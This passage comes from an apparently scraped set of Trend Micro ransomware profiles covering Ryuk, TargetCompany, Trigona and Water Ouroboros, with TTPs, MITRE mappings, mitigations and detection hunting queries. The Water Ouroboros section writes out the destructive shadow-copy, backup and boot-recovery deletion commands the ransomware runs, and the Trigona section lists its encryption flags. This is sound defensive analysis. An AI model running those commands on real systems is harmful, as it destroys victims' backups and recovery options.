inventory - Take an inventory of assets and data - Identify authorized and unauthorized devices and software - Make an audit of event and incident logs Configure and monitor - Manage hardware and software configurations - Grant admin privileges and access only when necessary to an employee’s role - Monitor network ports, protocols, and services - Activate security configurations on network infrastructure devices such as firewalls and routers - Establish a software allow list that only executes legitimate applications Patch and update - Conduct regular vulnerability assessments - Perform patching or virtual patching for operating systems and applications - Update software and applications to their latest versions Protect and recover - Implement data protection, backup, and recovery measures - Enable multifactor authentication (MFA) Secure and defend - Employ sandbox analysis to block malicious emails - Deploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network - Detect early signs of an attack such as the presence of suspicious tools in the system - Use advanced detection technologies such as those powered by AI and machine learning Train and test - Regularly train and assess employees on security skills - Conduct red-team exercises and penetration tests A multilayered approach can help organizations guard the possible entry points into the system (endpoint, email, web, and network).\nSecurity solutions can detect malicious components and suspicious behavior could help protect enterprises. -\nTrend Vision One™ – Endpoint Security provides multilayered prevention and protection capabilities across every stage of the attack chain.\nIndustry-leading intrusion prevention empowers you to mitigate known but unpatched threats that can help block questionable behavior and tools early on before the ransomware can do irreversible damage to the system.\nPredict if files are malicious and detect indicators of attack before they get a chance to execute. -\nTrend Vision One™ – Cloud Security provides advanced server security for physical, virtual, and cloud servers through file integrity monitoring, server intrusion prevention, and container security.\nIt protects enterprise applications and data from breaches and business disruptions without requiring emergency patching. -\nTrend Vision One™ – Email and Collaboration Security monitors employee risk levels in real-time with email user risk assessments, swiftly detects and responds to user-targeted threats, and implement email security and prevention measures to disrupt the attack chain and effectively mitigate risk.\nLike it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":83,"metadata":{"source":"blog","platform":"trendmicro","filename":"RansomHub"}}
{"id":197,"title":"Ryuk 2020: Distributing Ransomware via TrickBot and BazarLoader | Trend Micro (US)","publish_date":"2018-08-28","link":"https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ryuk-2020-distributing-ransomware-via-trickbot-and-bazarloader","clean_text":"Ryuk 2020: Distributing Ransomware via TrickBot and BazarLoader Ryuk first appeared in August 2018, when it was first reported to have targeted several organizations across the globe.\nSince then, Ryuk has become a staple in the cybercrime scene.\nIn fact, as one of the most ubiquitous ransomware families, it is responsible for a third of all ransomware attacks in 2020.\nRyuk employs a wide range of delivery methods.\nIt is commonly known to be deployed by other malware families such as Trickbot or Emotet, as seen in an incident from early 2019 where malicious actors first used Trickbot to move laterally within their victim’s system before using it to deploy the ransomware.\nRyuk has also been seen exploiting various vulnerabilities both as a propagation method and as part of its routine.\nWhat makes Ryuk particularly dangerous is its ability to move laterally within the system.\nIt uses both malicious tools and vulnerabilities like EternalBlue and Zerologon to propagate within a network.\nThis means that instead of having to infect each endpoint individually, Ryuk merely has to get a foothold within the IT infrastructure to infect multiple machines.\nStarting this year, Ryuk began using another dropper called BazarLoader (also known as BazarBackdoor).\nLike Trickbot, BazarLoader is also primarily distributed via phishing emails that contain either malicious attachments or links to websites (typically free, online file-hosting solutions) that host malware.\nThese phishing emails use normal social engineering techniques: For example, they are usually disguised as business correspondence or other important messages.\nOnce the payload is distributed, a command-and-control (C&C) server is used to deploy and install the backdoor.\nAccording to the advisory, the threat actor behind TrickBot is also connected to BazarLoader.\nOne of the characteristics that distinguishes Ryuk from previous ransomware families is the amount that is extorted by the malicious actors behind it.\nAs of the first quarter of 2020, the ransomware payment for a Ryuk attack averaged at US$ 1.3 million.\nFrom May to September of 2020, there was little Ryuk activity (if any).\nNevertheless, a few notable incidents did occur earlier this year, such as the infection of a US government contractor in February.\nMore recently, Ryuk has been observed being deployed in conjunction with the Zerologon vulnerability to encrypt whole domains in a span of a few hours.\nWhat are Ryuk’s current targets?\nAlthough there are currently no mentions of any mass infections in specific sectors, a few organizations have reported being recently hit by ransomware attacks.\nOn October 27, three hospitals in St. Lawrence County in New York were hit by a series of ransomware attacks described as a new variant of Ryuk.\nAnother hospital, the Sky Lakes Medical Center, also reported being victimized by a Ryuk attack that hit their computer systems and rendered them inaccessible.\nWhat can be done about Ryuk attacks?\nWe have published a security alert with detailed mitigation steps on this page.\nTo protect themselves, organizations are encouraged to take the following steps: - Patch domain controllers to protect them from being exploited by the Zerologon bug, which is used to gain domain level access. -\nConsider either completely disabling administrative shares or blocking access via firewall solutions.\nIt’s important to note here that Ryuk has been found attempting to encrypt files using Windows administrative shares. -\nDisable PowerShell with Group Policy, as this would add another layer of protection given the widespread use of PowerShell in malware attacks on the network. -\nAlways regularly back up all data (preferably by using the 3-2-1 rule) to ensure that it can still be accessed even in the event of successful ransomware encryption.\nThe 3-2-1 rule involves keeping multiple copies of sensitive data and servers in separate and physically secure locations. -\nConsider making files read-only to most users unless they need read/write permission.\nFurthermore, files older than a certain period (ideally three to six months) should be switched to read-only. -\nFor Trend Micro customers, ensure that all Trend Micro endpoint and server protection products enable and configure critical features such as Ransomware Protection, Predictive Machine Learning, and Behavior Monitoring. -\nFor Trend Micro Cloud One™ Workload Security and Trend Micro™ Deep Security™ customers, enable Agent Self-Protection.\nIndicators of compromise (IOCs) related to this threat can be found here.\nLike it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":47,"metadata":{"source":"blog","platform":"trendmicro","filename":"Ryuk"}}
{"id":198,"title":"Ransomware Spotlight: TargetCompany | Trend Micro (US)","publish_date":"2021-06-28","link":"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-targetcompany","clean_text":"Ransomware Spotlight: TargetCompany Top affected countries and industries according to Trend Micro data In this section, we examine the TargetCompany ransomware’s attempts to compromise organizations since it was first reported in 2021, based on Trend Micro™ Smart Protection Network™ country, regional, and industry data.\nNote that this data covers only Trend customers and does not contain all victims of TargetCompany.\nOur telemetry data detected attempted attacks from the TargetCompany group on Trend customers as early as March 2022.\nBy April 2023, our detections total 269 attempted attacks.\nTargetCompany has been observed to avoid attacking enterprises from Kazakhstan, Russia, Qatar, and Ukraine, although the group claims that its attack behaviors and patterns are not politically motivated.\nOur telemetry data showed that many of the top 10 countries targeted by TargetCompany are Asian countries.\nOf the 269 Trend customers targeted, 250 disclosed their locations.\nFigure 3.\nThe top 10 countries from a total of 250 detected attack attempts in terms of infected machines for the TargetCompany ransomware (March 2022 – April 2023) Source: Trend Micro Smart Protection Network Data from customers who specified their industries showed that the ransomware group targeted enterprises in the manufacturing, retail, and telecommunications industries.\nFigure 4.\nThe top 10 Trend customer organizations that experienced the most attack attempts from threat actors behind TargetCompany.\nData includes customers who specified their industry. (\nMarch 2022 – April 2023) Source: Trend Micro Smart Protection Network Targeted regions and industries according to TargetCompany ransomware’s leak site This section looks at data based on attacks recorded on the leak site of the operators behind the TargetCompany ransomware.\nBased on a combination of Trend's open-source intelligence (OSINT) research and investigations of the leak site, TargetCompany revealed 20 successfully infiltrated victims who refused to pay the ransom demand as of this writing.\nIt is important to note that this figure might differ from the actual damage, especially since the leak site was only launched in November 2022, over a year since the ransomware group’s activities were first detected.\nOf the total number of revealed victims in the leak site data, TargetCompany set their eyes mostly on enterprises from the Asia-Pacific region, followed by Europe and Middle East.\nFigure 5.\nThe distribution by region of Royal ransomware’s victim organizations Sources: TargetCompany’s leak site and Trend's OSINT research (November 2022 – May 2023) Threat actors behind the ransomware group launched attacks on organizations mostly in India, followed by Saudi Arabia, with the gang declaring only one victim from each of the other countries specified.\nFigure 6.\nThe countries and number of attacks executed by the TargetCompany ransomware group Sources: TargetCompany’s leak site and Trend’s OSINT research (November 2022 – May 2023) Majority of TargetCompany’s victim organizations were small businesses.\nHowever, a number of victims did not have their sizes specified.\nFigure 7.\nThe distribution by organization size of TargetCompany's victim organizations Sources: TargetCompany’s leak site and Trend’s OSINT research (November 2022 – May 2023) Finally, among the victims identified in TargetCompany’s leak site, the gang mostly victimized enterprises from the IT, manufacturing, apparel and fashion, and automobile industries.\nFigure 8.\nA breakdown of the industries that suffered TargetCompany ransomware attacks Sources: TargetCompany’s leak site and Trend’s OSINT research (November 2022 – May 2023) Initial Access - TargetCompany has been observed to use CVE-2019-1069 and CVE-2020-0618, remote code execution (RCE) vulnerabilities that allow attackers to execute arbitrary code. -\nThe group possibly also leverages remote execution via the xp_cmdshell feature in Microsoft SQL Server. -\nThe latest variant of TargetCompany ransomware, Xollam, executed a spam campaign that proved to be successful in delivering malware using OneNote malicious files as an initial access technique to gain access to its victim’s system.\nExecution TargetCompany threat actors execute the following commands that create a PowerShell script.\nThis script downloads a malicious file from the TargetCompany C&C server to execute on the target system via WMIC.\nFigure 10.\nThe command TargetCompany executes to create a PowerShell script that downloads its payload from its C&C server - Payloads of early versions of the ransomware from June 2021 were dependent on the link downloaded by the PowerShell script and could either be TargetComp ransomware, the Remcos backdoor, the Negasteal malware, or the Snake Keylogger malware. -\nIn January 2022, the group incorporated reflective loading, wherein the PowerShell script downloaded a .NET downloader that retrieved an encrypted payload from the group’s C&C server.\nThe payload is decrypted through XOR or inversion and is executed in memory.\nDefense Evasion - Upon successfully gaining access to the victim’s system, attackers use tools such as GMER and Advance Process Termination to manually uninstall antivirus products on the target system. -\nWe also observed the presence of YDArk.exe (PCHunter64) for performing rootkit behaviors. -\nWe also observed TargetCompany dropping KILLAV to terminate security-related processes and services. -\nThe ransomware also drops a batch file named killer.bat that terminates various services and applications, including GPS-related services.\nDiscovery - The TargetCompany ransomware uses network scan to collect network connection information in the system. -\nWe also observed the use of Mimikatz to gather credential information stored in the affected machine.\nLateral Movement - TargetCompany threat actors use RCE via remote desktop to move laterally within the network of their victims.\nCommand and Control - Throughout its evolution, TargetCompany has been consistent in accessing a C&C server to download and deliver its ransomware payload and other components.\nIn our investigation, we discovered that the Mallox C&C server was an open directory that enabled us to easily access its content and examine it.\nHowever, the group eventually switched to using an Nginx web server, which prevents threat researchers from visiting its site.\nThis also makes it more challenging to download the group’s payload and analyze its binaries.\nFigure 11.\nThe text displayed on the Nginx web server that the TargetCompany ransomware group switched to from its initial open directory Impact - The ransomware then encrypts the victim's files using the ChaCha20 encryption algorithm and generates the encryption keys using a combination of Curve25519, an example of elliptic curve cryptography, and AES-128. -\nThe ransomware adds the following file extension to its encryptions (“.mallox,” “.exploit,” “.avast,” “.consultransom,” “.devicZz”) and drops HOW TO RECOVER !!\n.TXT\"/\"FILE RECOVERY.txt as its ransom note.\nMITRE tactics and techniques | Initial Access | Execution | Persistence | Defense Evasion | Discovery | Credential Access | Command and Control | Lateral Movement | Impact | |---|---|---|---|---|---|---|---|---| T1190 - Exploit Public-Facing Application | T1059.001 - Command and Scripting Interpreter: PowerShell T1047 - Windows Management Instrumentation T1059.003 - Command and Scripting Interpreter: Windows Command Shell | T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1574.010 - Hijack Execution Flow: Services File Permissions Weakness T1543.003 - Windows Service | T1222.001 - Windows File and Directory Permissions Modification T1036.005 - Masquerading: Match Legitimate Name or Location T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild T1218 - System Binary Proxy Execution T1070.004 - Indicator Removal on Host T1562.001 - Impair Defenses: Disable or Modify Tools T1112 - Modify Registry T1620 - Reflective Code Loading T1070.004 - Indicator Removal: File Deletion | T1567 - Exfiltration Over Web Service T1082 - System Language Discovery T1049 - System Network Connections Discovery | T1003.001 - OS Credential Dumping: LSASS Memory | T1071.001 - Application Layer Protocol: | T1570 - Lateral Tool Transfer | T1489 - Service Stop T1486 - Data Encrypted T1490 - Inhibit System Recovery | Summary of malware, tools, and exploits used | Initial Access | Remcos backdoor | | Discovery | Network scan | | Collection | MIMIKATZ | | Execution | Trojan.\nBAT.TARGETCOMP* | | Defense Evasion | GMER | | Advance Process Termination | | | YDArk | Recommendations TargetCompany evolved from a rookie ransomware group to a formidable threat when it implemented reflective loading and might be joining the ranks of groups who adopt the RaaS business model to expand their profits.\nOur investigation of its tactics, techniques, and procedures (TTPs) reveals indications that the threat actors behind it share connections with other groups.\nThere is enough indication that the TargetCompany ransomware continues to be an active threat in the landscape, which calls for sustained vigilance on the part of enterprises.\nTo protect systems against the TargetCompany ransomware and other similar threats, organizations can implement security frameworks that allocate resources systematically to establish a strong defense strategy.\nHere are some best practices that organizations can adopt to defend themselves against the TargetCompany ransomware: Audit and inventory - Take an inventory of assets and data. -\nIdentify authorized and unauthorized devices and types of software. -\nAudit event and incident logs.\nConfigure and monitor - Manage hardware and software configurations. -\nGrant admin privileges and access only when necessary to an employee’s role. -\nMonitor network ports, protocols, and services. -\nActivate security configurations on network infrastructure devices such as firewalls and routers. -\nEstablish a software allowlist that only executes legitimate applications.\nPatch and update - Conduct regular vulnerability assessments. -\nPerform patching or virtual patching for operating systems and applications. -\nUpdate software and applications to their latest versions.\nProtect and recover - Implement data protection, backup, and recovery measures. -\nEnable multifactor authentication (MFA).\nSecure and defend - Employ sandbox analysis to block malicious emails. -\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network. -\nDiscover early signs of an attack, such as the presence of suspicious tools in the system. -\nUse advanced detection technologies such as those powered by AI and machine learning.\nTrain and test - Regularly train and assess employees’ security skills. -\nConduct red-team exercises and penetration tests.\nA multilayered approach can help organizations guard possible entry points into their system (endpoint, email, web, and network).\nSecurity solutions can detect malicious components and suspicious behavior, which can in turn help protect enterprises. -\nTrend Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools early on before ransomware can do irreversible damage to the system. -\nTrend Cloud One™ – Workload Security protects systems against both known and unknown threats that exploit vulnerabilities.\nThis protection is made possible through techniques such as virtual patching and machine learning. -\nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block malicious emails, including phishing emails that can serve as entry points for ransomware. -\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring the protection of endpoints.\nIndicators of Compromise (IOCs) The IOCs for this article can be found here.\nActual indicators might vary per attack.\nTrend Micro Vision One Hunting Query Trend Vision One customers can use the following hunting query to check if their network/system is possibly affected by TargetCompany ransomware: ((processCmd:\"?:*\\\\cmd.exe\" AND objectFilePath:\"*.update.ps1*\") AND (objectFilePath:\"*.update.ps1 & WMIC processs call create*\")) OR ((processCmd:\"?:*bat.exe\" AND objectFilePath:\"*-win -enc*\")) OR (fullPath:”(*.XOLLAM OR *.MALLOX OR *.FARGO OR *.MALLAB)”) Like it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":92,"metadata":{"source":"blog","platform":"trendmicro","filename":"TargetCompany"}}
{"id":199,"title":"Ransomware Spotlight: Trigona | Trend Micro (US)","publish_date":"2022-10-28","link":"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-trigona","clean_text":"Ransomware Spotlight: Trigona Top affected countries and industries according to Trend data This section cites Trend Micro™ Smart Protection Network™ (SPN) data on Trigona’s attempts to compromise organizations.\nNote that these detections pertain only to Trend customers and cover only a part of the Trigona victims.\nWe first detected Trigona attack attempts on Trend customers in July 2023 and noted that the number of attempts peaked the following month.\nAttempted attacks then declined until the reported shutdown of the ransomware group’s leak site.\nTurkey and the Philippines topped the Trigona attack detections at 23.5% and 19.6%, respectively, while Brazil followed closely at 13.7%.\nGermany and Thailand rounded up the top five countries targeted by Trigona during its time of activity.\nIndustry data showed that threat actors behind Trigona targeted government organizations the most, with attack attempts making up 21.4% of total detections, according to feedback from Trend customers who detailed the industries in which they belong.\nTrigona also targeted enterprises in the technology, retail, fast-moving consumer goods, and banking industries.\nTargeted regions and industries according to Trigona ransomware’s leak site This section looks at data based on attacks recorded on the leak site of the Trigona ransomware from April 2023 to October of the same year, when the leak site was taken down.\nThe following data represents organizations that were successfully infiltrated by the Trigona ransomware and which refused to pay the ransom.\nBased on a combination of Trend’s open-source intelligence (OSINT) research and investigation of the leak site, Trigona ransomware compromised a total of 33 organizations within the aforementioned period.\nOf these, 45.5% were organizations operating from North America, while 27.3% were from Europe.\nEnterprises in Asia-Pacific and Latin America and the Caribbean were also compromised.\nFigure 4.\nThe distribution by region of Trigona’s victim organizations Sources: Trigona ransomware’s leak site and Trend Micro’s OSINT research (April 2023 – October 2023) Based on the leak site data, out of the 13 countries targeted, the United States made up almost half of the victim organizations.\nOrganizations from the United Kingdom made up 9.1%, while Australian organizations made up 6.1% of Trigona’s victims.\nFigure 5.\nThe top five countries targeted by the Trigona ransomware Sources: Trigona ransomware’s leak site and Trend Micro’s OSINT research (April 2023 – October 2023) Threat actors behind the Trigona ransomware targeted enterprises in the finance industry the most, with 18.2% of its victim organizations classified under this trade.\nFigure 6.\nThe top five industries targeted by the Trigona ransomware Sources: Trigona ransomware’s leak site and Trend Micro’s OSINT research (April 2023 – October 2023) Trigona set its sights on small- and medium-sized businesses, which made up more than half of the group’s total victims from April to October 2023.\nFigure 7.\nThe distribution by organization size of the Trigona ransomware’s victims Sources: Trigona ransomware’s leak site and Trend Micro’s OSINT research (April 2023 – October 2023) Infection chain and techniques Initial Access - Trigona threat actors were observed leveraging the vulnerability CVE-2021-40539. -\nTrigona also targets compromised accounts by obtaining access from network access brokers.\nDefense Evasion, Discovery - Trigona drops turnoff.bat (detected as Trojan.\nBAT.TASKILL.AE) and defoff.bat (detected as Trojan.\nBAT.KILLAV.WLDP and Trojan.\nBAT.KILLAV.WLDX), which are used to terminate antivirus-related services and processes, including Trend-related service TMBMSRV.exe. -\nTrigona also uses Network Scanner and Advanced Port Scanner to identify network connections.\nCredential Access/Collection - Trigona operators use Mimikatz to dump passwords and credentials on victim machines.\nLateral Movement - Trigona operators use Splashtop, a legitimate remote access tool, to drop additional tools in a compromised machine. -\nThe threat actors also use other tools, such as LogMeIn, ScreenConnect, AnyDesk, and TeamViewer, for remote access. -\nOne of the samples we investigated showed that Trigona could utilize Cobalt Strike to drop MHYPROTINST (detected as Trojan.\nWin64.MHYPROTINST.A or Trojan.\nWin64.MHYPROTINST.B), which is used to terminate antivirus processes.\nPrivilege Escalation - Trigona operators make use of Common Language Runtime (CLR) shell on attacks seen on MSSQL servers.\nThe CLR shell tool is capable of multiple commands, one of which drops additional executables for privilege escalation (nt.exe).\nImpact - The Trigona ransomware encrypts data on victim machines using the Advanced Encryption Standard (AES) algorithm.\nIt contains an encrypted configuration in its resource section that would be decrypted upon execution.\nHowever, it will only use certain strings within its configuration during execution.\nIt also randomizes the file names of encrypted files and appends the extension “._locked”. -\nTrigona also uses TDCP_rijndael to encrypt target files.\nIt will only encrypt the first 0x80000 bytes (512 KB) of a file unless executed with the argument /full.\nAdditional information Newer versions of the Trigona ransomware make use of additional command-line arguments.\nThe following table summarizes the command-line arguments it accepts: | /r | Encrypts files in random order | | /full | Encrypts the whole content of a file; by default, only the first 0x80000 bytes/512 KB are encrypted | | /erase | Deletes contents of a file | | /!autorun | Prevents creating an autorun registry | | /is_testing | Used for testing purposes; used with /test_cid and /test_vid | | /test_cid | Used to input test CID | | /test_vid | Used to input test VID | | /p | Specifies path to encrypt | | /path | Prevents encrypting local files | | /!local | | | /!lan | Prevents encrypting network shares | | /shdwn | Turns off the machine after encryption | | /autorun_only | Installs autorun, but does not trigger the encryption | The Linux version of Trigona found in the wild shares similarities with its Windows counterpart.\nThe Linux version of Trigona accepts the following command-line arguments: | /erase | Deletes contents of a file | | /is_testing | Used for testing purposes; used with /test_cid and /test_vid | | /test_cid | Used to input test CID | | /test_vid | Used to input test VID | | /path | Specifies the path to encrypt | | /shdwn | Turns off the machine after encryption | The 64-bit versions of Trigona found in June 2023 contains the following additional command-line arguments: | /sleep | Sets the ransomware to “sleep” or be dormant for a specified time before execution | | /debug | Executes in debug mode; needs to be executed with /p | | /log_f | Used for logging and specifying the log file | | /fast | Most likely used to speed up encryption, but our analysis showed that this argument doesn’t work | | /allow_system | Used to allow encrypting files in system directory | MITRE tactics and techniques | Initial Access | Persistence | Defense Evasion | Discovery | Impact | |---|---|---|---|---| T1190 - Exploit Public-Facing Application | T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys/Startup Folder | T1140 - Deobfuscate/Decode Files or Information T1218.005 - System Binary Proxy Execution: Mshta T1036.005 - Masquerading: Match Legitimate Name or Location T1497.003 - Virtualization/Sandbox Evasion: Time-Based Evasion | T1083 - File and Directory Discovery T1135 - Network Share Discovery T1033 - System Owner/User Discovery | T1529 - System Shutdown/Reboot T1486 - Data Encrypted for Impact T1485 - Data Destruction | Summary of malware, tools, and exploits used | Initial Access | Defense Evasion | Discovery | Lateral Movement | Privilege Escalation | Impact | |---|---|---|---|---|---| | | | | | | | | |||| | | |||| | | |||| | ||||| | Security recommendations Despite reports that the Trigona ransomware’s leak site has been shut down, it is worth examining how threat actors behind the group conducted their operations.\nWhile relatively new, Trigona successfully facilitated various techniques and created versions to target specific operating systems within its one year of activity.\nThe group, which gained a reputation for imposing intimidating time constraints within which victims were pressured to pay ransom, was also observed targeting data beyond the infected machine and into shared network drives.\nThese behaviors suggest that the threat actors behind the group are quick to adapt, not to mention fierce in carrying out their schemes.\nCombined with Trigona’s assumed affiliation with CryLock and BlackCat, there is a possibility of the threat actors regrouping after the shutdown and respawning under a different name.\nTo protect systems against ransomware and other similar threats, organizations can implement security frameworks that allocate resources systematically to establish a strong defense strategy.\nThe following are some best practices that organizations can consider to help protect themselves from ransomware infections: Audit and inventory - Take an inventory of assets and data. -\nIdentify authorized and unauthorized devices and software. -\nMake an audit of event and incident logs.\nConfigure and monitor - Manage hardware and software configurations. -\nGrant admin privileges and access only when necessary to an employee’s role. -\nMonitor network ports, protocols, and services. -\nActivate security configurations on network infrastructure devices such as firewalls and routers. -\nEstablish a software allowlist that executes only legitimate applications.\nPatch and update - Conduct regular vulnerability assessments. -\nPerform patching or virtual patching for operating systems and applications. -\nUpdate software and applications to their latest versions.\nProtect and recover - Implement data protection, backup, and recovery measures. -\nEnable multifactor authentication (MFA).\nSecure and defend - Employ sandbox analysis to block malicious emails. -\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network. -\nDetect early signs of an attack such as the presence of suspicious tools in the system. -\nUse advanced detection technologies such as those powered by artificial intelligence (AI) and machine learning.\nTrain and test - Regularly train and assess employees in security skills. -\nConduct red-team exercises and penetration tests.\nA multilayered approach can help organizations guard possible entry points into the system (endpoint, email, web, and network).\nSecurity solutions that can detect malicious components and suspicious behavior can also help protect enterprises. -\nTrend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools early on before the ransomware can do irreversible damage to the system. -\nTrend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities.\nThis protection is made possible through techniques such as virtual patching and machine learning. -\nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block malicious emails, including phishing emails that can serve as entry points for ransomware. -\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats and ransomware, ensuring the protection of endpoints.\nIndicators of compromise (IOCs) The IOCs for the threat discussed in this article can be found here.\nActual indicators might vary per attack.\nTrend Micro Vision One Hunting Query Trend Vision One customers can use the following hunting query to check if their network/system is possibly affected by Trigona ransomware: fullPath:\"*._locked\" OR fullPath:\"*available_for_trial*._locked\" OR fullPath:\"*\\\\how_to_decrypt.txt\" OR malName:\"*TRIGONA.*.note\" OR malName:\"*CRYLOCK.*.note\" OR (processFilePath:\"*\\\\mshta.exe\" AND filefullpath:\"*\\\\how_to_decrypt.hta\") OR (objectRegistryKeyHandle:\"*\\\\Run\\\\*\" AND objectRegistryData:\"*\\\\how_to_decrypt.hta\") Like it?\nAdd this infographic to your site: 1.\nClick on the box below.\n2.\nPress Ctrl+A to select all.\n3.\nPress Ctrl+C to copy.\n4.\nPaste the code into your page (Ctrl+V).\nImage will appear the same size as you see above.\nRecent Posts - Deepfake It ‘til You Make It: A Comprehensive View of the New AI Criminal Toolset - Proactive Security: The Role of Exposure Management and Detection-Response Capability - The Trend Micro Underground Series - The Road to Agentic AI: Defining a New Paradigm for Technology and Cybersecurity - Stay Ahead of AI Threats: Secure LLM Applications with Trend Vision One","num_sentences":89,"metadata":{"source":"blog","platform":"trendmicro","filename":"Trigona"}}
{"id":200,"title":"Ransomware Spotlight: Water Ouroboros | Trend Micro (US)","publish_date":"2023-10-28","link":"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-water-ouroboros","clean_text":"Ransomware Spotlight: Water Ouroboros Technical Details The ransomware accepts the following arguments: | Argument | Details | |---|---| | c {username}:{password} | A required argument that specifies the username and password to access the contact page | | -a, -attach, --attach | Enables logging | | -A, -no-aggressive, --no-aggressive | Disables the deletion of backups and recovery | | -E, -no-extension, --no-extension | Disables appending of extension to files | | -m, -min-size, --min-size | Specifies the minimum file size for encryption (in bytes) | | {File or Path to encrypt} | Encrypts a specific file or directory | Table 1.\nThe arguments accepted by the Water Ouroboros ransomware It encrypts fixed, removable, and network drives.\nIt also executes the following commands: - wmic.exe shadowcopy delete - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures - wbadmin.exe delete systemstatebackup -keepVersions:3 - wbadmin.exe delete systemstatebackup - bcdedit.exe /set {default} recoveryenabled No - vssadmin.exe delete shadows /all /quiet - wbadmin.exe delete catalog-quiet - notepad.exe {Drive}:\\Contact Us.txt During encryption, Water Ouroboros appends the following extension to the file name of the encrypted files: - {original filename}.{original extension}.locked The ransomware contains a list of strings or extensions to determine which files to avoid for encryption: - 386 - adv - ani - bat - bin - cab - cmd - com - cpl - cur - deskthemepack - diagcab - diagcfg - diagpkg - dll - drv - exe - hlp - hta - icl - icns - ico - ics - idx - key - ldf - lnk - lock - mod - mpa - msc - msi - msp - msstyles - msu - nls - nomedia - ocx - pdb - prf - ps1 - rom - rtp - scr - shs - spl - sys - theme - themepack - wpxF Certain variants avoid encrypting files with the specified strings or extensions in their file path.\nThe following are the ransom notes dropped during infection: - {Encrypted Directory}\\Contact Us.txt - {Drive}:\\Contact Us.txt During the encryption routine, it generates and exports the encryption keys and generates the ransom note.\nIt directs the victim to a password-protected Onion domain (TOR website): - https://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd[.]onion/ It also warns the victim of the impending disclosure of their stolen data on the Hive Leaks site: - https://hiveleakdbtnp76ulyhi52eag6c6tyc.onion/ From the function App_ExportKey(), it uses standard Go crypto functions to generate RSA keys.\nA key file is then exported.\nIt generates a random key for the encryption process using the RTLGenRandom API, which is initially saved in memory.\nThis key is then used to encrypt the files via a custom encryption implementation.\nThe key is subsequently encrypted via GoLang’s implementation of RSA, using a list of public keys embedded in the binary.\nThe encrypted key is then saved as .key on the encrypted drive.\nFinally, the generated key is wiped from memory, ensuring that the encrypted key is the only copy available for decryption.\nInfection chain and techniques Initial Access - Water Ouroboros exploits public-facing Oracle WebLogic application using known vulnerabilities (CVE-2019-2725, CVE-2017-10271, CVE-2019-2729). -\nIt comes bundled in a software installer package (Drive-by Compromise).\nExecution - Water Ouroboros performs remote command execution on the compromised server. -\nIt downloads and executes crack software and key generators on multiple endpoints.\nPersistence - Water Ouroboros uses a compromised admin account to maintain access to the target’s machine. -\nIt disables security services by modifying the registry.\nPrivilege - Water Ouroboros employs credential dumping via registry hives to access sensitive OS credentials.\nLateral Movement - Water Ouroboros uses Remote Desktop Protocol (RDP) and Server Message Block (SMB) to access other systems within the network.\nDiscovery - Water Ouroboros discovers networks and accounts using tools like AdFind. -\nIt performs credential discovery via PassView or Registry Hive Dumping.\nExfiltration - Water Ouroboros transfers files over the C&C channel to external IP addresses. -\nIt uses storage software tools for exfiltration.\nDefense Evasion - Water Ouroboros disables security tools and services. -\nPCHunter and ProcessHacker are disabled via a valid account RDP or Remote Access Tools (RATs).\nCredential Dumping - Water Ouroboros dumps credentials using HackTool PassView or Registry Hive.\nCollection - Water Ouroboros transfers malicious tools and scripts to compromised systems.\nCommand and Control - Water Ouroboros communicates with C&C servers using web protocols. -\nIt uses the SharpRhino RAT.\nImpact - Water Ouroboros encrypts data. -\nIt drops ransom notes to notify the user of file encryption and potential data leaks. -\nIt inhibits system recovery by deleting volume shadow copies and disabling recovery measures.\nMITRE tactics and techniques | Initial Access | Execution | Defense Evasion | Credential Access | Discovery | Lateral Movement | Exfiltration | Command and Control | Impact | |---|---|---|---|---|---|---|---|---| T1190 - Exploit Public-Facing Application T1189 - Drive-by Compromise T1078 - Valid Accounts | T1059.003 - Command and Scripting Interpreter: Windows Command Shell | T1562.001 - Impair Defenses: Disable or Modify Tools | T1003.002 - OS Credential Dumping: Security Account Manager (SAM) 